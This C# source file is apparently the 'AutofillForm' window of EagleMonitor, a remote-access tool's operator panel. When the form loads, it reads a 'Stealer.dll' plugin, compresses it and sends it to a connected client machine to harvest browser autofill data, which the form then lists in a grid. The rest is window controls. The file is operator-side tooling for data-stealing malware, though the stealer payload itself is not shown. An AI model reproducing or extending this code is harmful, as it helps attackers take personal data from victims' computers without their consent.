using EagleMonitor.Controls;
using EagleMonitor.Networking;
using EagleMonitor.Utils;
using PacketLib;
using PacketLib.Packet;
using System;
using System.IO;
using System.Windows.Forms;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace EagleMonitor.Forms
{
    public partial class AutofillForm : FormPattern
    {
        private ClientHandler clientHandler { get; set; }
        internal AutofillForm(ClientHandler clientHandler)
        {
            this.clientHandler = clientHandler;
            InitializeComponent();
        }

        private void PasswordsForm_Load(object sender, EventArgs e)
        {
            new Guna.UI2.WinForms.Helpers.DataGridViewScrollHelper(dataGridView1, guna2VScrollBar1, true);
            Miscellaneous.Enable(this.dataGridView1);

            AutofillPacket autofillPacket = new AutofillPacket
            {
                plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\Stealer.dll"), 1)
            };

            this.clientHandler.SendPacket(autofillPacket);
        }

        private void closeButton_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void maximizeButton_Click(object sender, EventArgs e)
        {
            if (this.WindowState == FormWindowState.Normal)
            {
                this.WindowState = FormWindowState.Maximized;
            }
            else
            {
                this.WindowState = FormWindowState.Normal;
            }
        }

        private void minimizeButton_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }

        private void label1_MouseDown(object sender, MouseEventArgs e)
        {
            ReleaseCapture();
            SendMessage(this.FindForm().Handle, 161, 2, 0);
        }
    }
}
